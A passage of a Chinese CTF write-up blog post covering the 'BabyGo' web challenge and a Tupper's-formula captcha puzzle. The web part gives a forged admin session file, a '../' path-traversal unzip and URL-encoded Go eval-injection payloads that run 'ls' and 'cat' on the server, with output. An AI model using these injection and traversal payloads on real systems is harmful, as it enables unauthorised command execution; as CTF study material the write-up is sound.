+<p><code>go run getAdmin.go</code> 运行后即可在当前文件夹下生成一个”user.gob”文件，文件内的权限为admin。go文件的运行要求一个文件夹下多个go文件是相互联系的，因此最好新建文件夹来运行go脚本。压缩并上传”user.gob”，访问”&#x2F;unzip”解压文件并传入”path&#x3D;..&#x2F;“，接着访问”&#x2F;backdoor”会发现响应了一个”good”，表明权限已经是admin了。接下来需要利用eval进行RCE，参考 <a class="link"   target="_blank" rel="noopener" href="https://www.ctfiot.com/55141.html" >Go-沙箱逃逸 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 得到以下payload：</p>
+<p>原始payload：</p>
+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Eval(<span class="string">&quot;os/exec\&quot;\n\&quot;fmt\&quot;)\nfunc\tinit()&#123;\ncmd\t:=exec.Command(\&quot;ls\&quot;)\nres,err\t:=\tcmd.CombinedOutput()\nfmt.Println(string(res))\nfmt.Println(err)\n&#125;\nconst(\nMessage=\&quot;fmt&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>url编码后的payload：</p>
+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?pkg=os/exec<span class="string">&quot;%0A&quot;</span>fmt<span class="string">&quot;)%0Afunc%09init()&#123;%0Acmd%09:=exec.Command(&quot;</span>ls<span class="string">&quot;)%0Ares,err%09:=%09cmd.CombinedOutput()%0Afmt.Println(string(res))%0Afmt.Println(err)%0A&#125;%0Aconst(%0AMessage=&quot;</span>fmt</span><br><span class="line"></span><br><span class="line">=&gt; <span class="keyword">go</span>.mod <span class="keyword">go</span>.sum main main.<span class="keyword">go</span> template &lt;<span class="literal">nil</span>&gt; Good</span><br></pre></td></tr></table></figure></div>
+
+<p>url编码中：<code>%09==\t</code> ，<code>%0A==\n</code> . 这个payload很奇怪啊，按理来说传入的内容作为字符串再次被传入Eval中，里面的引号、换行、制表符都需要转义才能被正确读取，这里却不需要转义就能正确读取。<br>猜测是传入的 <code>pkg</code> 变量中的内容被URL解码后，将被严格视为字符串，特殊字符将被自动转义处理，再传入Go中的字符串。<br>当传参形式是字符串时，参数后跟的内容被严格视为字符串；当传入参数被视为json解析时，内部的结构由于自代引号，需要考虑特殊字符的转义问题。</p>
+<p>经测试，payload中的换行不能缺少，且传入的内容不能含有空格，否则会出现报错：<code>expected &#39;STRING&#39;, found &#39;/&#39;</code>  </p>
+<p>eval内部调用的函数是 <code>exec.Command()</code> ，它可以传多个命令行参数，而无需传入完整的 <code>&quot;ls /&quot;</code> </p>
+<p>尽管换行符不需要被反斜杠转义，但它必须被URL编码。在hackbar中，若将 <code>%0a</code> 直接换为换行符，传入后端后会报错：<code>syntax error: unexpected func, expecting semicolon or newline</code> . func前检测不到换行符，希望有一个分号或另起一行。显然换行符不进行URL编码将会被忽视。<br>制表符对RCE无影响。</p>
+<p>我们会发现：对于Go语法而言，特定的换行符是必要的；而URL编码的意义是保证换行符在传输到后端Go语言时不被丢弃；在服务器接收参数时可能会自动丢弃空白字符如制表符、空格、换行符；尽可能的URL编码能够保证传输的参数正确完整的到达后端。</p>
+<p>获取flag的payload：</p>
+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?pkg=os/exec<span class="string">&quot;%0A&quot;</span>fmt<span class="string">&quot;)%0Afunc%09init()&#123;%0Acmd%09:=exec.Command(&quot;</span>cat<span class="string">&quot;,&quot;</span>/ffflllaaaggg<span class="string">&quot;)%0Ares,err%09:=%09cmd.CombinedOutput()%0Afmt.Println(string(res))%0Afmt.Println(err)%0A&#125;%0Aconst(%0AMessage=&quot;</span>fmt</span><br><span class="line"></span><br><span class="line">=&gt; flag&#123;<span class="number">29e95</span>e44-b363<span class="number">-48</span>ba<span class="number">-9e0</span>f<span class="number">-87020</span>fed2f59&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>得到flag：<code>flag&#123;29e95e44-b363-48ba-9e0f-87020fed2f59&#125;</code></p>
+<h4 id="词本-1"><a href="#词本-1" class="headerlink" title="词本"></a>词本</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">semicolon: 分号</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>提示”tupper”：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/ygys1234/article/details/109686348" >Tupper（塔珀自指公式） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。就是提供了一个可以用于绘制指定大小（17px*106px）图的函数，该函数通过更改参数k来获取不同的像素图。</p>
+<p>测试代码：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Tupper_self_referential_formula</span>(<span class="params">k</span>): </span><br><span class="line">    aa = np.zeros((<span class="number">17</span>,<span class="number">106</span>))</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x, y</span>):</span><br><span class="line">        y += k</span><br><span class="line">        a1 = <span class="number">2</span>**-(-<span class="number">17</span>*x - y%<span class="number">17</span>)</span><br><span class="line">        a2 = (y // <span class="number">17</span>) // a1</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span> a2 % <span class="number">2</span> &gt; <span class="number">0.5</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">106</span>):</span><br><span class="line">            aa[y, x] = f(x, y)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> aa[:,::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">k = <span class="number">1594199391770250354455183081054802631580554590456781276981302978243348088576774816981145460077422136047780972200375212293357383685099969525103172039042888918139627966684645793042724447954308373948403404873262837470923601139156304668538304057819343713500158029312192443296076902692735780417298059011568971988619463802818660736654049870484193411780158317168232187100668526865387478661078082009408188033574841574337151898932291631715135266804518790328831268881702387643369637508117317249879868707531954723945940226278368605203277838681081840279561</span></span><br><span class="line">aa = Tupper_self_referential_formula(k)</span><br><span class="line">plt.imshow(aa, origin=<span class="string">&quot;upper&quot;</span>)	<span class="comment"># imshow处理图片，show展示图片</span></span><br><span class="line">plt.xlim(<span class="number">106</span>, <span class="number">0</span>)    <span class="comment"># upper下翻转x轴让最终生成的图片方向正确</span></span><br><span class="line">plt.ylim(<span class="number">0</span>, <span class="number">17</span>)</span><br><span class="line">plt.show()</span><br><span class="line">base1 = k-<span class="number">17</span>*(<span class="number">0</span>)</span><br><span class="line">base2 = k+<span class="number">17</span>*(<span class="number">0</span>)</span><br><span class="line">cwd = os.path.dirname(__file__)+<span class="string">&quot;/tupperImgs/&quot;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(cwd)):</span><br><span class="line">    os.makedirs(cwd)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;Continue for more figures?&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    k1 = base1 - <span class="number">1</span>*(i+<span class="number">1</span>)</span><br><span class="line">    k2 = base2 + <span class="number">1</span>*(i+<span class="number">1</span>)</span><br><span class="line">    aa_1 = Tupper_self_referential_formula(k1)</span><br><span class="line">    plt.imshow(aa_1, origin=<span class="string">&#x27;upper&#x27;</span>)</span><br><span class="line">    plt.xlim(<span class="number">106</span>, <span class="number">0</span>)</span><br><span class="line">    plt.ylim(<span class="number">0</span>, <span class="number">17</span>)</span><br><span class="line">    plt.savefig(cwd+<span class="string">&quot;-&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">    aa_2 = Tupper_self_referential_formula(k2)</span><br><span class="line">    plt.imshow(aa_2, origin=<span class="string">&#x27;upper&#x27;</span>)</span><br><span class="line">    plt.xlim(<span class="number">106</span>, <span class="number">0</span>)</span><br><span class="line">    plt.ylim(<span class="number">0</span>, <span class="number">17</span>)</span><br><span class="line">    plt.savefig(cwd+<span class="string">&quot;+&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;.jpg&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>自指的k保留一下，有543位：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selfReferentialK = <span class="number">960939379918958884971672962127852754715004339660129306651505519271702802395266424689642842174350718121267153782770623355993237280874144307891325963941337723487857735749823926629715517173716995165232890538221612403238855866184013235585136048828693337902491454229288667081096184496091705183454067827731551705405381627380967602565625016981482083418783163849115590225610003652351370343874461848378737238198224849863465033159410054974700593138339226497249461751545728366702369745461014655997933798537483143786841806593422227898388722980000748404719</span></span><br></pre></td></tr></table></figure></div>
+
+<p>提供的zip包中有136张图片，每张四个验证码，不会图像识别又租不起识别云服务的可怜ctfer只能人工识别了（以下是手动检查了两遍的结果）：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k1 = <span class="number">1594199391770250354455183081054802631580554590456781276981302978243348088576774816981145460077422136047780972200375212293357383685099969525103172039042888918139627966684645793042724447954308373948403404873262837470923601139156304668538304057819343713500158029312192443296076902692735780417298059011568971988619463802818660736654049870484193411780158317168232187100668526865387478661078082009408188033574841574337151898932291631715135266804518790328831268881702387643369637508117317249879868707531954723945940226278368605203277838681081840279552</span></span><br></pre></td></tr></table></figure></div>
+
+<p>绘制出的图片是这样的：<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://picturebed-1310517892.file.myqcloud.com/Figure_2.png"
+                      alt="Figure_2"
+                >看起来像是上下穿越了的图片，手动裁剪一下会得到完整的图片，但也可以把k改一改：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k2 = <span class="number">1594199391770250354455183081054802631580554590456781276981302978243348088576774816981145460077422136047780972200375212293357383685099969525103172039042888918139627966684645793042724447954308373948403404873262837470923601139156304668538304057819343713500158029312192443296076902692735780417298059011568971988619463802818660736654049870484193411780158317168232187100668526865387478661078082009408188033574841574337151898932291631715135266804518790328831268881702387643369637508117317249879868707531954723945940226278368605203277838681081840279561</span></span><br></pre></td></tr></table></figure></div>
+
+<p>得到的图片：<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://picturebed-1310517892.file.myqcloud.com/Figure_1.png"
+                      alt="Figure_1"
+                ></p>
+<p>看到ISC，左边的空间也不多了，那猜一猜就是：<code>flag&#123;MISC_COOL!!&#125;</code> ，提交到buu上会发现flag是对的（向已结束比赛提交正确的flag，它才会提示比赛已经结束；错误的flag会告诉你是错的）</p>
+<hr>
+<p>那为什么改k可以呢，灵感来自：<a class="link"   target="_blank" rel="noopener" href="https://tuppers-formula.ovh/" >在线tuupers-formular绘制 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，传入k1会提示该数字不被17整除，将其加个9变成k2就能被17整除，我们就能得到一张正确的图片。（该网站只能处理17倍数的k，但在博客中拿来的代码可以处理所有的k）</p>
+<p>试着偏移一下k，会得到：<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://picturebed-1310517892.file.myqcloud.com/imageonline-co-gifimage.gif"
+                      alt="imageonline-co-gifimage"
+                ></p>
+<p>k的作用是偏移图片，每17次偏移会有一个像素点的变化，不断地偏移k就是在遍历所有像素点的变化。</p>
+<p>工具：<a class="link"   target="_blank" rel="noopener" href="https://gif.imageonline.co/cn/" >GIF免费制作 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   target="_blank" rel="noopener" href="https://tuppers-formula.ovh/" >在线tuupers-formular绘制 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
+<ul>
+<li><input disabled="" type="checkbox"> 也许有大佬能写一个一个简单的数字字母识别脚本?（1，4，6个字符识别）</li>
+</ul>
+<!-- flag of hidden posts -->
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> VnCtf</li>
+        <li><strong>Author:</strong> Forestsetyou</li>
+        <li><strong>Created at
+                :</strong> 2023-02-28 22:42:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2023-03-11 15:51:00
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://forestsetyou.github.io/2023/02/28/Security/CTF/VnCtf/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">VnCtf</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#VnCtf"><span class="nav-text">VnCtf</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B1%A1%E6%A3%8B%E7%8E%8B%E5%AD%90"><span class="nav-text">象棋王子</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%B5%E5%AD%90%E6%9C%A8%E9%B1%BC"><span class="nav-text">电子木鱼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BabyGo"><span class="nav-text">BabyGo</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81"><span class="nav-text">验证码</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Forestsetyou</a>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.1</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
